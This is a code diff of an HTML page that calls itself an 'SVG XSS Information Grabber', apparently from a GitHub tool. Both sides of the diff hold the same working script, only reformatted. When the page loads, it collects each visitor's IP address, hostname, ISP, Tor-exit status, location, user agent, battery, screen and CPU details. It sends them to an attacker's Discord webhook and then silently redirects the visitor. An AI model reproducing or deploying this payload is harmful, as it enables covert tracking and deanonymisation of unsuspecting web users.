@@ -4,99 +4,40 @@
 <title>Untitled Website</title>
 <head>
    <script src="https://cdn.rawgit.com/github/fetch/master/fetch.js">
-   url2 = "url link here"
+   url2 = "url to redirect to"
    try {
-      var opts = {
-      method: 'GET',      
-      headers: {}
-      };
-      fetch('https://myip.wtf/json', opts).then(function (response) {
-      return response.json()
-      })
-      .then(function (data) {
-      hostname= data.YourFuckingHostname
-      agent = navigator.userAgent
-      text=data.YourFuckingIPAddress
-      vpn = data.YourFuckingTorExit
-      loca = data.YourFuckingLocation
-      isp = data.YourFuckingISP
-      download = navigator.connection.downlink
-      battery = window.navigator.battery
-      screensize=window.screen.availWidth+" x "+window.screen.availHeight
+      var opts = { method: 'GET', headers: {}};
+      fetch('https://myip.wtf/json', opts).then(function (response) {return response.json()}).then(function (data) {
       var Name = "Not known";
-        if (navigator.appVersion.indexOf("Win") != -1) Name = 
-          "Windows OS";
-        if (navigator.appVersion.indexOf("Mac") != -1) Name = 
-          "MacOS";
-        if (navigator.appVersion.indexOf("X11") != -1) Name = 
-          "UNIX OS";
-        if (navigator.appVersion.indexOf("Linux") != -1) Name = 
-          "Linux OS";
-      cores = navigator.hardwareConcurrency 
+      if (navigator.appVersion.indexOf("Win") != -1) Name = "Windows OS";
+      if (navigator.appVersion.indexOf("Mac") != -1) Name = "MacOS";
+      if (navigator.appVersion.indexOf("X11") != -1) Name = "UNIX OS";
+      if (navigator.appVersion.indexOf("Linux") != -1) Name = "Linux OS";
       navigator.getBattery().then(function(battery) {
          var opts2 = {
             method:"POST",
             headers: {"Content-Type": "application/json"},
             body: JSON.stringify({
-               username: "SVG XSS Information Grabber by SSSEAL-C on Github",
+               username: "SVG XSS Information Grabber - By SSSEAL-C on Github",
                avatar_url: "https://i.imgur.com/Yztlbk4.png",
-               embeds: [
-               { 
+               embeds: [{ 
                   title: 'SVG XSS Attack', 
                   fields: [ 
-                  { 
-                     name: 'IP :globe_with_meridians:', 
-                     value: "`"+text+"`",
-                     inline: "true",
-                  },
-                  {
-                     name: 'User Agent :bust_in_silhouette:',
-                     value: "`"+agent+"`",
-                     inline: "true",
-                  } ,
-                  {
-                     name: 'Hostname :name_badge:',
-                     value: "`"+hostname+"`",
-                     inline: "true",
-                  } ,
-                  {
-                     name: 'ISP :classical_building:',
-                     value: "`"+isp+'`',
-                     inline: 'true'
-                  },
-                  {
-                     name: 'VPN :computer:',
-                     value: "`"+vpn+'`',
-                     inline: 'true'
-                  },
-                  {
-                     name:'Location :map:',
-                     value: "`"+loca+'`',
-                     inline: 'true'
-                  },
-                  {
-                     name:'Page Redirect?',
-                     value: "`"+url2+'`',
-                     inline: 'true'
-                  },
-                  {
-                     name:'Other',
-                     value:'```Battery Charging?: '+battery.charging+"\nDownload Speed in Megabytes per second: "+download+"\nScreen Size: "+screensize+'\nOS: '+Name+"\nUsed Cpu Cores: "+cores+"\n```",
-                     inline:true
-                  }
+                  { name: 'IP :globe_with_meridians:',  value: "`"+data.YourFuckingIPAddress+"`", inline: "true" },
+                  { name: 'User Agent :bust_in_silhouette:', value: "`"+navigator.userAgent+"`", inline: "true" } ,
+                  { name: 'Hostname :name_badge:', value: "`"+data.YourFuckingHostname+"`", inline: "true" },
+                  { name: 'ISP :classical_building:', value: "`"+data.YourFuckingISP+'`', inline: 'true' },
+                  { name: 'VPN :computer:', value: "`"+data.YourFuckingTorExit+'`', inline: 'true' },
+                  { name:'Location :map:', value: "`"+data.YourFuckingLocation+'`', inline: 'true' },
+                  { name:'Page Redirect?', value: "`"+url2+'`', inline: 'true' },
+                  { name:'Other', value:'```Battery Charging?: '+battery.charging+"\nDownload Speed (mbps): "+navigator.connection.downlink+"\nScreen Size: "+window.screen.availWidth+" x "+window.screen.availHeight+'\nOS: '+Name+"\nUsed Cpu Cores: "+navigator.hardwareConcurrency+"\n```",  inline:true }
                   ]
-               }
-               ]
-            })
-         }
-         var URL = `webhook url`;
+               }]})}
+         var URL = `webhook link`;
          fetch(URL, opts2).then(function (response) {
             console.log(response);
             window.location.replace(url2); 
-      });
-     });
-      });
-   }
+      })})})}
    catch(err) {
       console.log(err);
       window.location.replace(url2);  
